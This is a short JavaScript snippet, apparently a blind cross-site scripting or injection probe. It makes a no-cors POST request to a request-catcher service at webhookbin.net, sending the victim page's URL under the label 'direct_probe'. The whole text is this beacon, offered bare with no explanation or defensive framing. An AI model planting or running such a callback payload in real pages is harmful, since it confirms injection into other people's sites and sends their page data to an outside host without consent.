fetch('https://webhookbin.net/v1/bin/0f1d7eb0-PLACEHOLDER', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'stage=direct_probe&u=' + encodeURIComponent(location.href)
});
